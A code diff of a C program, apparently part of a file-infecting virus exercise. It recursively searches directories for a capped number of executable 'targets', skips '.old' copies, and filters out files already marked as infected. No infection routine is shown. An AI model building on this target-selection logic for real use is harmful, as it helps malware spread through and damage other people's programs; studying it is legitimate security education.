@@ -7,12 +7,12 @@
 #include <string.h>
 #include <stdbool.h>
 
-#define NB_CIBLES 10
+#define NB_CIBLES 5
 
 typedef struct Element Element;
 struct Element
 {
-    char fichier[100];
+    char fichier[200];
     Element *next;
     Element *prev;
 };
@@ -125,21 +125,19 @@ List* recursiveResearch(List* fichiers, List* old, char* PATH, int cibles){
 
     dirp = opendir(PATH);
     char fichier[500];
-
+    
     while ((entry = readdir(dirp)) != NULL) {
         
         sprintf(fichier,"%s/%s",PATH,entry->d_name);
-        
 
         if (stat(fichier, &s) != -1) {
             if (S_ISDIR(s.st_mode) && !strstr(entry->d_name,".") && !strstr(entry->d_name,"..") && cibles < NB_CIBLES ) {
-                recursiveResearch(fichiers, old, fichier, cibles);
+                fichiers = recursiveResearch(fichiers, old, fichier, cibles);
             }
             if ((s.st_mode & S_IXUSR) && (s.st_mode & S_IFREG)){
                 if (!strstr(entry->d_name,".old") && cibles < NB_CIBLES) //->Passe avec "MonPg1.old.qqch" ou ".olderFile" (. étant le fichier caché)
                 {
-                    //printf("Fichier : %s\n", fichier);
-                    insert(fichiers, fichier);
+                    fichiers = insert(fichiers, fichier);
                     cibles++;
                 } 
                 else
@@ -149,16 +147,16 @@ List* recursiveResearch(List* fichiers, List* old, char* PATH, int cibles){
             }
         }
     }
+    
 
    if (fichiers)
     {
         Element *actuel = fichiers->p;
         while (actuel != NULL)
         {
-            printf("%s\n", actuel->fichier);
-            //if (isInfected(actuel->fichier, old)){
-            //    deleteItem(fichiers, actuel);
-            //}
+            if (isInfected(actuel->fichier, old)){
+                deleteItem(fichiers, actuel);
+            }
             actuel = actuel->prev;
         }
     }
@@ -173,8 +171,10 @@ int main(){
     }
 
     List* old = NULL;
-    List* cibles = recursiveResearch(cibles, old, PATH, 0);
+    List* cibles = NULL;
+    cibles = recursiveResearch(cibles, old, PATH, 0);
 
-    //printList(cibles);
+    printList(cibles);
+
     return EXIT_SUCCESS;
 }
